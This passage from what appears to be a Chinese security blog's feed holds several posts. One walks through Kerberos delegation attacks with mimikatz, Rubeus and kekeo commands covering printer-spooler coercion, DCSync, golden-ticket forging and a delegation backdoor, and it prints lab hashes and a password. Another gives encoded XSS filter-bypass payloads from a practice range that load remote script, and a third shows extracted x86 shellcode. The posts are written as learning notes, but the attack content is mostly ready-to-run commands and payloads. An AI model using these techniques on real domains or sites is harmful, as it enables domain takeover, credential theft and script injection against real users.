rel="noopener">http://www.sweetscape.com/010editor/repository/templates/</a></p><p>下载EXE.bt，使用010 Editor加载运行模板<br><img src="https://s1.ax1x.com/2020/07/05/UShiNT.png" alt=""></p><p>点击Open Template，打开对应的模板，按F5运行<br><img src="https://s1.ax1x.com/2020/07/05/UShME6.png" alt=""></p><p>运行后会多处一个窗口，里面就是解析好的数据。（然后点开对应的结构，跟着表看就行）<br><img src="https://s1.ax1x.com/2020/07/05/USh3CD.png" alt=""></p><p>定位对应的段是使用地址来定位的，查看对应的VirtualAddress地址通过计算即可得到对应的节段地址<br>这里查看重定位表示例:<br><img src="https://s1.ax1x.com/2020/07/05/UShNDI.png" alt=""></p><p>对应VirtualAddress（虚拟地址）：28648h、Size：900<br>使用LordPE进行计算，得到地址<br><img src="https://s1.ax1x.com/2020/07/05/USh058.png" alt=""></p><p>010 Editor按Ctrl+G输入24248即可到达对应的地址<br><img src="https://s1.ax1x.com/2020/07/05/USh5PU.md.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kerberos委派利用</title>
      <link href="/posts/216ead38.html"/>
      <url>/posts/216ead38.html</url>
      <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>最近看了不少委派利用的方式，也试着复现了不少。总结一下，常见的委派如下</p><ul><li>无约束委派</li><li>约束委派</li><li>资源委派</li></ul><p>使用委派前提：<br>用户是个服务账户，使用setspn注册用户服务<br>setspn格式：</p><pre><code>&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;&lt;service class&gt;：标识服务类的字符串&lt;host&gt;：服务所在主机名称&lt;port&gt;：服务端口&lt;service name&gt;：服务名称Example：setspn -D Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01Ps:服务一定是computer存在的，不然是无效的，之前傻逼试了半天。发现没有成功，是服务不存在的原因-&gt;约束委派Examples：MSSQLMSSQLSvc/adsmsSQLAP01.adsecurity.org:1433ExchangeexchangeMDB/adsmsEXCAS01.adsecurity.orgRDPTERMSERV/adsmsEXCAS01.adsecurity.orgWSMan / WinRM / PS RemotingWSMAN/adsmsEXCAS01.adsecurity.orgHyper-V HostMicrosoft Virtual Console Service/adsmsHV01.adsecurity.orgVMWare VCenterSTS/adsmsVC01.adsecurity.org</code></pre><p>可以委派的东西：</p><ul><li>user</li><li>computer</li></ul><p>委派里的术语：</p><pre><code>* 不信任此用户作为委派：不允许此用户委派* 信任此用户作为任何服务的委派：非约束委派* 仅信任此用户作为指定服务的委派    * 仅使用Kerberos（只将用户作为kerberos服务委派）    * 指定服务类型委派</code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>computername:WIN-SLMQA1H7SLB.DOMAIN.local ip:192.168.1.201 域内主机<br>computername:WIN-SJDK9J352PJ.DOMAIN.local ip:192.168.1.109 域控</p><h2 id="准备过程"><a href="#准备过程" class="headerlink" title="准备过程"></a>准备过程</h2><p>无约束委派用户user01 (这样和约束委派没啥区别的感觉…当然可能我的理解有误)</p><pre><code>setspn -A Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYEQKS.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/22/NYE8Ej.png" alt=""></p><p><strong>同一个服务重新注册服务的时候，记得把用户取消注册服务</strong></p><pre><code>setspn -D &lt;service&gt;/&lt;host&gt; &lt;username&gt;Example:setspn -D Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01</code></pre><p>无约束委派主机WIN-SLMQA1H7SLB<br><img src="https://s1.ax1x.com/2020/06/22/NYEU2V.md.png" alt=""></p><p>约束委派用户</p><pre><code>setspn -U -A Server/WIN-SJDK9J352PJ.DOMAIN.local:445 user01</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYm8yV.png" alt=""></p><h2 id="无约束委派"><a href="#无约束委派" class="headerlink" title="无约束委派"></a>无约束委派</h2><p>利用前提:得到被委派主机的权限<br>利用的方法:</p><ul><li>被动搜刮机子里的票据，看看有没有高权的票据</li><li>非约束委派+Spooler打印机服务 制作黄金票据</li><li>中继攻击 (没测试)</li></ul><p><strong> 被动利用 </strong><br>假设DC访问配置了SPN的域内主机<br><img src="https://s1.ax1x.com/2020/06/22/NYVxl6.png" alt=""></p><p>域内主机使用mimikatz导出票据</p><pre><code>mimikatz command:privilege::debugsekulrsa::tickets /export</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZAfI.png" alt=""></p><p>但是不是krbtgt，非kerberos协议无法利用</p><p><strong>主动利用</strong><br>开启Rubeus监听域控传来的密钥</p><pre><code>格式:Rubeus.exe monitor /interval:1 /filteruser:&lt;域控computername&gt;$ #interval代表1秒监听一次，filteruser表示只监听指定主机的密钥，不设置则监听所有传来的密钥Rubeus.exe monitor /interval:1 /filteruser:WIN-SJDK9J352PJ$</code></pre><p>利用打印服务强制让域控机向域内主机表名身份</p><pre><code>格式:SpoolSample_v4.5_x64..exe &lt;域控computername&gt; &lt;被设置为非约束委派的computername&gt;SpoolSample_v4.5_x64..exe WIN-SJDK9J352PJ WIN-SLMQA1H7SLB</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZWHe.md.png" alt=""></p><p>将得到的base64处理一下(去掉空格换行符那些)，使用powershell转换成TGT</p><pre><code>[IO.File]::WriteAllBytes(&quot;绝对路径\ticket.kribi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;) #绝对路径是必须的否则不行</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZ7gP.png" alt=""></p><p>Ps:我们这儿获得的TGT票据，不能算黄金票据，因为我们获得的权限只是域控的本地管理权限，所以不能连接域控，但是我们确可以因此获取所以用户的hash，所以能制作真正的黄金票据</p><p>dump dcsync</p><pre><code>kerberos::purgekerberos::ptt tckest.kribikerberos::listlsadump::dcsync /domain DOMAIN.local /all /csv</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZOHg.md.png" alt=""></p><p>制作金票</p><pre><code>1.域SID (whoami /user去掉权限位就是，最后一个-和后面的内容不要)2.Krbtgt的hash3.要伪造的用户名4.导出的票据名称kerberos::golden /domain:DOMAIN.local /SID:S-1-5-21-447451162-2905414466-2158217208 /krbtgt:3545206ebb9114742e9de826d0d35de7 /user:administrator /ticket:ntlm.kirbi</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYey5j.png" alt=""></p><p>导入金票利用：</p><pre><code>kerberos::purgekerberos::ptt ntlm.kirbiexitklist #查看当前票据</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYe4qU.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/22/NYeqR1.md.png" alt=""></p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>利用前提:得到被委派的用户账户或hash或TGT<br>利用的方法:<br>受限委派的情况下，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务。<br>但是如果攻击者可以获取到开启非限制委派的服务账户的明文口令/NTLM Hash，也可以伪造TGT和S4U请求<br>伪装成服务账户以任意账户的权限（如域管理员）申请TGS<br>其中服务账户的明文口令可能可以通过Kerberoasting攻击获取<br>在知道服务账号明文口令的情况下，使用kekeo获取TGT</p><pre><code>kekeo.exe &quot;tgt::ask /user:&lt;username&gt; /domain:&lt;domain&gt; /password:&lt;password&gt;&quot; exit</code></pre><p>kekeo也支持直接使用NTLM进行TGT请求</p><pre><code>kekeo.exe &quot;tgt::ask /user:iis_svc /domain:lab.local /NTLM:a87f3a337d73085c45f9416be5787d86&quot; exit</code></pre><p>如果攻击者可以直接拿到IIS服务所在服务器的权限，也可以直接从内存中提取服务账户TGT，无需进行tgt::ask，直接tgt::s4u即可</p><pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ticket /export&quot; exit</code></pre><p>kekeo通过s4u请求以DOMAIN\test用户身份访问CIFS的TGS<br>S4U2Self获取到的ticket和S4U2Proxy获取到的WIN-SJDK9J352PJ CIFS服务的TGS会以文件保存在当前目录下</p><pre><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_test@DOMAIN.LOCAL_krbtgt~DOMAIN.local@DOMAIN.LOCAL.kirbi /user:Administrator@DOMAIN.local /service:cifs/WIN-SJDK9J352PJ.DOMAIN.local&quot; exit</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYM9nP.png" alt=""><br>mimikatz将获取到的TGS写入当前会话<br><img src="https://s1.ax1x.com/2020/06/22/NYQEVK.png" alt=""><br><img src="https://s1.ax1x.com/2020/06/22/NYQZ5D.png" alt=""></p><p><strong>后门维持</strong></p><ul><li>变种金票(windows server 2012域控没有成功)-&gt;<a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></li><li>受限委派 + DCSync 维持域权限</li></ul><p>随便注册一个服务</p><pre><code>setspn -U -A backdoor/WIN-SLMQA1H7SLB.DOMAIN.local user01</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYbJJA.png" alt=""><br>使用1powershell设置属性(ldap协议注册)</p><pre><code>$user = Get-ADUser user01 -Properties &quot;msDS-AllowedToDelegateTo&quot;Set-ADObject $user -Add @{ &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;ldap/WIN-SJDK9J352PJ.DOMAIN.local&quot;) }Set-ADAccountControl $user -TrustedToAuthForDelegation $true</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYqpYd.png" alt=""></p><p>如果想取消用户的msDS-AllowedToDelegateTo，可以用powerview（当然set-aduser应该也行）</p><pre><code>Set-DomainObject user01 -Clear &#39;msDS-AllowedToDelegateTo&#39; -Verbose用set-aduser:Set-ADUser user01 -Clear &#39;msDS-AllowedToDelegateTo&#39;</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLPN4.png" alt=""></p><p>在把对应的用户勾选不使用用户委派，重新用Ad用户和计算机打开看就没了<br><img src="https://s1.ax1x.com/2020/06/22/NYLQ4H.png" alt=""></p><p>使用user01的凭证申请TGT</p><pre><code>kekeo.exe &quot;tgt::ask /user:user01 /domain:DOMAIN.local /password:Haq1234561&quot; exit</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLtDf.png" alt=""></p><p>用TGT申请域控的凭证</p><pre><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_user01@DOMAIN.LOCAL_krbtgt~DOMAIN.local@DOMAIN.LOCAL.kirbi /user:haq@DOMAIN.local /service:ldap/WIN-SJDK9J352PJ.DOMAIN.local&quot; exit</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLdUg.png" alt=""></p><p>mimikatz导入TGT并使用lsadump::dsync导出krbtgt的hash</p><pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:DOMAIN.local /ntlm:3545206ebb9114742e9de826d0d35de7 /run:cmd.exe&quot; exitmimikatz.exe &quot;kerberos::golden /domain:DOMAIN.local /SID:S-1-5-21-447451162-2905414466-2158217208 /krbtgt:3545206ebb9114742e9de826d0d35de7 /user:administrator /ticket:ntlm.kirbi&quot; exit</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYL4PJ.png" alt=""></p><p>然后造金票，利用方法一样</p><h2 id="资源委派"><a href="#资源委派" class="headerlink" title="资源委派"></a>资源委派</h2><p>需要了解的两个协议</p><ul><li><p>S4U2Self<br>通过此扩展可以拿到一张标识任意用户身份的TGS(图中是去获取的用户X身份的TGS)，上文已经解释过了，它的作用其实是协议转换。当用户X使用非Kerberos协议请求网站A的时候，网站A是没有用户X的TGS的，但是是网站A要去获取文件服务器B的访问权限（TGS）需要用户X的TGS，因此S4U2Self解决了这个问题，网站A服务器可以使用它去向KDC请求一张用户X身份的TGS，网站A服务器再用这张TGS去发起S4U2proxy请求。</p></li><li><p>S4U2proxy<br>该拓展作用是使用一张用户X身份的TGS去向KDC请求一张用于访问文件服务器B的TGS，这张TGS的身份还是用户X，这样网站A就可以利用用户X的权限去访问文件服务器B上的文件了。</p></li></ul><p>用户要求-&gt;SPN用户(非SPN用户无法s4u申请域管票据)<br>资源委派-&gt;利用用户的ACL进行利用<br>主要注意的五个ACL权限-&gt;GenericAll、GenericWrite、WriteProperty、WriteDacl</p><p>微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）这篇文章提到的便是利用WriteProperty ACL从用域用户加入的时候就已经存在，所以可以利用这个ACL给自己添加一个机器账户(同时也是SPN)，然后给目标机器设置msDS-AllowedToActOnBehalfOfOtherIdentity msDS-AllowedToActOnBehalfOfOtherIdentity属性，然后在申请高权TGS导入。</p><p>过程：<br>.通过LDAP添加机器账户<br>2.并获取新建用户的SID<br>3.对指定目标机添加msDS-AllowedToActOnBehalfOfOtherIdentity，value为D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;新建用户的SID&gt;)<br>4.获取新账户的TGT<br>5.利用得到的TGT去申请高权(域管)的票据</p><p>msDS-AllowedToActOnBehalfOfOtherIdentity msDS-AllowedToActOnBehalfOfOtherIdentity<br>在上一篇文章《这是一篇“不一样”的真实渗透测试案例分析文章》中介绍过了。此属性作用是控制哪些用户可以模拟成域内任意用户然后向该计算机进行身份验证。简而言之， 如果我们可以修改该属性那么我们就能拿到一张域管理员的票据，但该票据只对这台机器生效，然后拿这张票据去对计算机进行认证。也就是说当域内存在任意一台域控和域功能级别是server 2012及以上时，可以通过给所在机器配置”msDS-AllowedToActOnBehalfOfOtherIdentity”属性来设置rbcd，然后通过s4u协议申请高权限票据进行利用。</p><p>利用SharpAllowedToAct可以成功给目标机子加上对应的msDS-AllowedToActOnBehalfOfOtherIdentity属性，但是setspn与文章不符，没法继续下去。emmm<br><img src="https://s1.ax1x.com/2020/06/23/NYOeRs.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/23/NYOKs0.png" alt=""></p><p>文章里成功添加用户并给目标机器添加了msDS-AllowedToActOnBehalfOfOtherIdentity属性后的SPN<br><img src="https://s1.ax1x.com/2020/06/23/NYOMLV.md.png" alt=""><br>(n0thing-pc为目标机器名)</p><p>自己测试过程<br><img src="https://s1.ax1x.com/2020/06/23/NYOlZT.png" alt=""></p><p>那么就直接总结一下算了….</p><p>寻找某个用户可操控的机子：</p><ul><li>利用powerView</li><li>利用C#</li></ul><p>powerview</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity &lt;computername&gt;  | ?{$_.SecurityIdentifier -match &quot;&lt;userid&gt;&quot;} #查询某个机子的权限</code></pre><p><img src="https://s1.ax1x.com/2020/06/23/NYOdL6.png" alt=""></p><p>C#</p><pre><code class="C#">using System;using System.Security.Principal;using System.DirectoryServices;namespace ConsoleApp9{    class Program    {        static void Main(string[] args)        {            DirectoryEntry ldap_conn = new DirectoryEntry(&quot;LDAP://dc=redteam,dc=com&quot;);            DirectorySearcher search = new DirectorySearcher(ldap_conn);            String query = &quot;(&amp;(objectClass=computer))&quot;;//查找计算机            search.Filter = query;            foreach (SearchResult r in search.FindAll())            {                String mS_DS_CreatorSID=&quot;&quot;;                String computername = &quot;&quot;;                try                {                    computername = r.Properties[&quot;dNSHostName&quot;][0].ToString();                    mS_DS_CreatorSID = (new SecurityIdentifier((byte[])r.Properties[&quot;mS-DS-CreatorSID&quot;][0], 0)).ToString();                    //Console.WriteLine(&quot;{0} {1}\n&quot;, computername, mS_DS_CreatorSID);                }                catch                {                    ;                }                //再通过sid找用户名                String UserQuery = &quot;(&amp;(objectClass=user))&quot;;                DirectorySearcher search2 = new DirectorySearcher(ldap_conn);                search2.Filter = UserQuery;                foreach (SearchResult u in search2.FindAll())                {                    String user_sid = (new SecurityIdentifier((byte[])u.Properties[&quot;objectSid&quot;][0], 0)).ToString();                    if (user_sid == mS_DS_CreatorSID) {                        //Console.WriteLine(&quot;debug&quot;);                        String username = u.Properties[&quot;name&quot;][0].ToString();                        Console.WriteLine(&quot;[*] [{0}] -&gt; creator  [{1}]&quot;,computername, username);                    }                }            }        }    }}</code></pre><p><img src="https://s1.ax1x.com/2020/06/23/NYORyt.png" alt=""></p><p>利用SharpAllowedToAct-master实现用户添加<br>仓库地址：<a href="https://github.com/pkb1s/SharpAllowedToAct" target="_blank" rel="noopener">https://github.com/pkb1s/SharpAllowedToAct</a></p><p><img src="https://s1.ax1x.com/2020/06/23/NYOoFg.png" alt=""></p><p>利用有两种方法</p><ul><li>Rubeus+Psexec</li><li>impacket工具包-&gt;getST.py+smbexec.py</li></ul><p>Rubeus+Psexec利用过程:</p><pre><code>Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local #转换成hash得到RC4Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt #申请票据导入Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/dm2008 /ptt #申请host票据，如果不申请host票据psexec无法返回shellpsexec \\&lt;computername&gt; -s cmdPs:用Rubeus你就得申请两个服务票据：HOST和CIFS，如果是用impacket套件的话就申请个CIFS就可以了。</code></pre><p>impacket提权如下<br>来自微信公众号文章《微软不认的提权漏洞——“烂番茄”》里的视频截图<br><img src="https://s1.ax1x.com/2020/06/23/NYOOO0.png" alt=""></p><p>Ps：在域内，服务权限那些，也可以利用这种方法提权。以为服务出网的时候用的账户的权限<br><img src="https://s1.ax1x.com/2020/06/23/NYXpY4.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss bypass 进阶</title>
      <link href="/posts/6bcf9b8f.html"/>
      <url>/posts/6bcf9b8f.html</url>
      <content type="html"><![CDATA[<p>在知识星球见到一位老哥的xss靶场，感觉不错做了后学到不少东西。由于懒惰，导致现在才写。<br>靶场一共有八题，只做了七题</p><p>靶场地址：<a href="http://xcao.vip" target="_blank" rel="noopener">http://xcao.vip</a><br>题目最终要求是加载：<a href="http://xcao.vip/xss/alert.js" target="_blank" rel="noopener">http://xcao.vip/xss/alert.js</a></p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><a href="http://xcao.vip/test/xss1.php" target="_blank" rel="noopener">独孤九剑-第一式</a><br>过滤了<code>=()</code>,输入点在标签里</p><p><img src="https://s1.ax1x.com/2020/06/08/thMJ6x.png" alt=""></p><p>利用<code>&lt;</code>闭合标签，使用document.write配合unicode编码写js到当前页面<br>payload:</p><pre><code>http://xcao.vip/test/xss1.php?data=1%22%3E%3Cscript%3Edocument.write`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`%3C/script%3E%3C!--)</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/thMo3n.png" alt=""></p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><a href="http://xcao.vip/test/xss2.php" target="_blank" rel="noopener">独孤九剑-第二式</a><br>过滤了<code>=().</code>输入点在标签里<br><img src="https://s1.ax1x.com/2020/06/08/thQuvt.png" alt=""></p><p>利用<code>&lt;</code>闭合标签，使用document.write配合top函数写js到当前页面<br>payload:</p><pre><code>http://xcao.vip/test/xss2.php?data=1%22%3E%3Cscript%3Etop[%22document%22][%22write%22]`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`%3C/script%3E%20%3C!--</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/thQN2n.png" alt=""></p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><a href="http://xcao.vip/test/xss3.php" target="_blank" rel="noopener">独孤九剑-第三式</a><br>过滤了<code>().&amp;#</code>这意味着没发使用unicode编码了，但是开放了=<br><img src="https://s1.ax1x.com/2020/06/08/thQ5VO.png" alt=""></p><p>将js放到某个公网ip上面，然后将ip转换成十进制即可<br>利用php的302跳转</p><pre><code class="php">&lt;?phpheader(&quot;Location: http://suo.im/5U1ERv&quot;);?&gt;</code></pre><p>payload：</p><pre><code>http://xcao.vip/test/xss3.php?data=1%22%3E%3Cscript%20src=%22http://2130706433%22%3E%3C/script%3E%3C!--</code></pre><p>这里的<code>2130706433</code>是10进制编码后的<code>127.0.0.1</code><br><img src="https://s1.ax1x.com/2020/06/08/thl8L6.png" alt=""></p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><a href="http://xcao.vip/test/xss4.php" target="_blank" rel="noopener">独孤九剑-第四式</a><br>过滤了<code>=().&amp;#\</code><br><img src="https://s1.ax1x.com/2020/06/08/th190K.png" alt=""></p><p>利用iframe标签然后配合base64编码的js加载</p><pre><code>http://xcao.vip/test/xss4.php?data=1%22%3E%3Cscript%3Etop[%22document%22][%22write%22]`${top[%22String%22][%22fromCharCode%22]`61`%2b%22data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=%3E111%3C/iframe%3E%22}%20%3Ciframe%20src`%3C/script%3E%3C!--</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/th1Z6I.png" alt=""></p><p>后面的第五题和第六题都可以用这个payload就不另想了</p><h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p><a href="http://xcao.vip/test/xss7.php" target="_blank" rel="noopener">独孤九剑-第七式</a><br>过滤了<code>=().&amp;#\%&lt;&gt;</code>，输入点在js里</p><p><img src="https://s1.ax1x.com/2020/06/08/th3UxA.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/08/th3eC4.png" alt=""></p><p>将=,&lt;,&gt;进行ascii编码，payload稍作修改即可</p><pre><code>http://xcao.vip/test/xss7.php?data=%22%22;top[%22document%22][%22write%22]`${top[%22String%22][%22fromCharCode%22]`60`%2b%22iframe%20src%22%2btop[%22String%22][%22fromCharCode%22]`61`%2b%22data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=%22%2btop[%22String%22][%22fromCharCode%22]`62`}`</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/th35ZV.png" alt=""></p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>第八题过滤的太变态暂时没思路<br><img src="https://s1.ax1x.com/2020/06/08/thG900.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>shellcode编写(基础篇)</title>
      <link href="/posts/c5435d4d.html"/>
      <url>/posts/c5435d4d.html</url>
      <content type="html"><![CDATA[<p>昨天看资讯的时候看到fb一篇写shellcode的。最近也学了汇编试了一下整出来了，做个记录虽然实战不靠谱，还要自动化找函数地址…</p><h2 id="Starting"><a href="#Starting" class="headerlink" title="Starting"></a>Starting</h2><p>环境：</p><pre><code>Windows XPVC++ 6.0</code></pre><p>此方法只适用于测试或者学习，无法动态执行shellcode。也就是说shellcode只能在XP上使用，因为从win7开始有了aslr<br>ASLR说明：<a href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/" target="_blank" rel="noopener">https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/</a></p><p>弹框测试：</p><pre><code class="c">#include&lt;windows.h&gt;int main(int argc,char** argv){    MessageBox(NULL,&quot;You are hacked by Migraine!&quot;,&quot;Pwned&quot;,MB_OK);}</code></pre><p>Alt+8调出反汇编模式可以观察是如何实现调用win API的<br><img src="https://s1.ax1x.com/2020/05/20/Y7Pete.png" alt=""></p><p>通过参阅文章发现不能直接提取机器码，必须用汇编在写一遍。然后在提取字节码</p><p>通过参阅文章明白汇编执行shellcode是如何执行的</p><pre><code class="c">//转自安全客文章#include&lt;windows.h&gt;void main(){    LoadLibrary(&quot;user32.dll&quot;);//Load DLL    __asm    {            push 0x00656e;ne        push 0x69617267;grai        push 0x694d2079;y Mi        push 0x62206565;ed b        push 0x6b636168;hack        push 0x20657261;Are        push 0x20756F59;You        mov ebx,esp        push 0x0        push 0x656e6961;aine        push 0x7267694d;Migr        mov ecx,esp        //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );        xor eax,eax        push eax//uTyoe-&gt;0        push ecx//lpCaption-&gt;Migraine        push ebx//lpText-&gt;You are hacked by Migraine        push eax//hWnd-&gt;0        mov esi,0x77D3ADD7//User32.dll-&gt;MessageBoxA        call esi    }}</code></pre><ul><li>将需要用到的字符串转成十六进制，由于是X86，一次可最多存放8个字节</li><li>将字符串转换的十六进制入栈</li><li>push 0x0后然后重复将需要的东西入栈，在次保存到另外个寄存器</li><li>然后从右到左设置win API的值（注意：从右到左）</li><li>最后将windows API的地址给esi</li><li>call 将当前执行指令地址入栈，然后无条件转移到由标签指示的指令</li></ul><p>通过OD给对应的API下断点，可以取得地址<br><img src="https://s1.ax1x.com/2020/05/20/Y7P29J.png" alt=""></p><p>(注：每个系统的地址都有差异)<br><img src="https://s1.ax1x.com/2020/05/20/Y7PTAO.png" alt=""></p><p>Examlpe：<br><img src="https://s1.ax1x.com/2020/05/20/Y7Pvut.png" alt=""></p><p>然后使用C内嵌asm，调试提取机器码<br><img src="https://s1.ax1x.com/2020/05/20/Y7iGK1.png" alt=""></p><p>整个asm范围的机器码提取出来：</p><pre><code>&quot;\x68\x6E\x65\x00\x00\x68\x67\x72\x61\x69\x68\x79\x20\x4D\x69\x68\x65\x65\x20\x62&quot;&quot;\x68\x68\x61\x63\x6B\x68\x61\x72\x65\x20\x68\x61\x62\x63\x00\x8B\xDC\x6A\x00\x68&quot;&quot;\x61\x69\x6E\x65\x68\x4D\x69\x67\x72\x8B\xCC\x33\xC0\x50\x68\x61\x69\x6E\x65\x68&quot;&quot;\x4D\x69\x67\x72\x8B\xCC\x33\xC0\x50\x51\x53\x50\xBE\xEA\x07\xD5\x77\xFF\xD6&quot;</code></pre><p>执行即可：<br><img src="https://s1.ax1x.com/2020/05/20/Y7iUUO.png" alt=""></p><p>用WinExec弹个calc</p><pre><code class="c">//WinExec address-7C86250D//ExitProcess address-7C81CB12#include&lt;windows.h&gt;int main(){    LoadLibrary(&quot;kernel32.dll&quot;);    __asm        {        push 0x636C6163;calc        mov eax,esp        push 0x0        push 0x5        mov ebx,esp        push ebx        push eax        mov esi,0x7C86250D        call esi        xor ecx,ecx        mov esi,0x7C81CB12        call esi    }    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/05/20/Y7igVf.png" alt=""></p><p>shellcode为</p><pre><code>&quot;\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x05\x8B\xDC\x53\x50\xBE\x0D\x25\x86\x7C&quot;&quot;\xFF\xD6\x33\xC9\xBE\x12\xCB\x81\x7C\xFF\xD6&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/05/20/Y7iXiF.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/20/Y7F9qx.png" alt=""></p><p>注意：如果你不知道calc变成十六进制怎么整，汇编整一个就好<br><img src="https://s1.ax1x.com/2020/05/20/Y7Ffw6.png" alt=""></p><p>参考链接：<br><a href="https://www.freebuf.com/articles/system/234277.html" target="_blank" rel="noopener">随笔之提取Shellcode简单利用本地缓冲区溢出 - FreeBuf互联网安全新媒体平台</a><br><a href="https://www.anquanke.com/post/id/195498#h3-3" target="_blank" rel="noopener">一步步学写Windows下的Shellcode - 安全客，安全资讯平台</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xposed+XServer无需脱壳抓取加密包(转)</title>
      <link href="/posts/ae6e67d.html"/>
      <url>/posts/ae6e67d.html</url>
      <content type="html"><![CDATA[<p><strong>本人完全不会Android之类的玩意</strong> 纯属踩坑</p><blockquote><p>她不是惊恐而是欢喜原来这个世界上还是会有人来救她的，原来这世界上还有人能听见她的声音，原来她并没有孤独到没有同类</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>夜神模拟器 6.6.0.5<br>Android version 5.1.1<br>Xposed.installer(5.11安卓系统)<br>Xserver (0.6.2)</p><p>4.42安卓模拟器Xposed框架链接：<br><a href="https://pan.baidu.com/s/1depSSHCy0KYcFZzkPH7aZQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1depSSHCy0KYcFZzkPH7aZQ</a> 密码: vmyr</p><p>5.11安卓模拟器Xposed框架链接：<br><a href="https://pan.baidu.com/s/1erZD4gMk1MQdVklnrmSuLg" target="_blank" rel="noopener">https://pan.baidu.com/s/1erZD4gMk1MQdVklnrmSuLg</a> 密码: s4j4</p><p>Xserver下载<br><a href="https://github.com/monkeylord/XServer" target="_blank" rel="noopener">https://github.com/monkeylord/XServer</a></p><h2 id="Starting"><a href="#Starting" class="headerlink" title="Starting"></a>Starting</h2><p>安好xp框架，然后安装好xserver<br><img 